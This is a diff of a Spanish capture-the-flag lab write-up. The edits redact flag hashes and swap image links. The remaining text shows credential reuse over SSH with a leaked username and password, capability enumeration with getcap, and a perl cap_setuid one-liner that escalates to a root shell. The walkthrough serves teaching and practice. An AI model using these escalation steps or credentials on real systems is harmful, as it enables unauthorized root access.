@@ -287,9 +287,7 @@ ssh bart@192.168.0.9
 # password: b4rtp0w4
 ```
 
-![SSH con usuario bart exitoso y flag de usuario]
 <img width="402" height="124" alt="image" src="https://github.com/user-attachments/assets/8528c910-9857-4e49-9add-3fd9f944bf92" />
-
 
 **Por qué `bart`:** probamos las credenciales extraídas contra el servicio SSH descubierto en la fase 2. El par **`bart:b4rtp0w4`** otorga acceso. Esta es la lección central del lab: **las credenciales de una aplicación suelen reutilizarse para el acceso al sistema**.
 
@@ -299,10 +297,10 @@ Ya dentro, enumeramos nuestro contexto:
 whoami        # bart
 id            # uid=1000(bart) gid=1000(bart) grupos=1000(bart)
 ls
-cat user.txt  # 598a05f84190e327bc4796335d948144
+cat user.txt  # 598a05f84190exxxxxxxxxx
 ```
 
-🏁 **Flag de usuario:** `598a05f84190e327bc4796335d948144`
+🏁 **Flag de usuario:** `598a05f84190exxxxxxxxxx`
 
 ---
 
@@ -314,7 +312,8 @@ cat user.txt  # 598a05f84190e327bc4796335d948144
 sudo -l
 ```
 
-![Sin permisos sudo para escalar a root](images/Sin_permisos_sudo_para_escalar_a_root.png)
+<img width="417" height="74" alt="Sin permisos sudo para escalar a root" src="https://github.com/user-attachments/assets/e0d28081-f911-4553-99e3-1d897e1c1296" />
+
 
 **Por qué:** el primer chequeo de escalada siempre es `sudo -l` (ver qué podemos ejecutar como otro usuario). Aquí devuelve `sudo: orden no encontrada` — el binario `sudo` ni siquiera está instalado. Vía descartada; hay que buscar otro vector.
 
@@ -324,7 +323,7 @@ sudo -l
 /usr/sbin/getcap -r / 2>/dev/null
 ```
 
-![Búsqueda de capabilities para escalar a root](images/Busqueda_de_capabilities_para_escalar_a_root.png)
+<img width="348" height="39" alt="Busqueda de capabilities para escalar a root" src="https://github.com/user-attachments/assets/84959b67-882f-4381-bb54-b83d2a945ca1" />
 
 **Por qué:** las **Linux Capabilities** fragmentan los privilegios de root en permisos granulares que pueden asignarse a binarios concretos. `getcap -r /` busca recursivamente binarios con capabilities asignadas (redirigimos *stderr* a `/dev/null` para silenciar los errores de permisos).
 
@@ -343,17 +342,17 @@ El binario **`perl`** tiene la capability **`cap_setuid`**. Esto le permite **ca
 perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
 ```
 
-![Escalada a root con GTFOBins y obtención de flag](images/Escalada_a_root_con_gtfobins_y_obtencion_de_flag.png)
+<img width="581" height="120" alt="image" src="https://github.com/user-attachments/assets/c083f694-24d4-4750-9b57-2a5541b1631d" />
 
 **Por qué funciona:** como `perl` posee `cap_setuid`, la llamada `POSIX::setuid(0)` tiene éxito y fija el UID a 0. A continuación `exec "/bin/bash"` reemplaza el proceso por una shell **que ya corre como root**.
 
 ```bash
 whoami        # root
 cd /root
-cat root.txt  # 1c4cddb6c20e0e756163b2a9714a1260
+cat root.txt  # 1c4cddb6c20exxxxxxxxxxxxxxxxxx
 ```
 
-🏁 **Flag de root:** `1c4cddb6c20e0e756163b2a9714a1260`
+🏁 **Flag de root:** `1c4cddb6c20xxxxxxxxxxxxxxxx`
 
 ---
 
@@ -375,16 +374,6 @@ cat root.txt  # 1c4cddb6c20e0e756163b2a9714a1260
 1. **SQL Injection** no parametrizada en el login → exposición de la base de datos.
 2. **Contraseñas en texto plano + reutilización** → acceso al sistema por SSH.
 3. **Capability `cap_setuid` sobre `perl`** → escalada a root.
-
----
-
-### Lecciones para quien está aprendiendo
-
-- **El reconocimiento manda.** El ARP discovery en LAN es más fiable que ICMP; el `-p-` evita perder puertos escondidos.
-- **La inyección a ciegas también se explota.** Sin mensajes de error, `time-based` extrae datos midiendo tiempos. Es lenta pero definitiva.
-- **Una credencial rara vez vive aislada.** El panel web era un señuelo; el verdadero valor de las contraseñas estaba en SSH (*password reuse*). Siempre probá credenciales encontradas en todos los servicios.
-- **`sudo` no es la única vía de escalada.** Cuando falta o está restringido, enumerá **capabilities**, binarios SUID, cron, PATH, etc. **GTFOBins** es tu mejor aliado.
-- **Enumerá, no adivines.** Cada fase (red → puertos → web → BD → sistema) alimenta la siguiente con datos concretos.
 
 ---
 
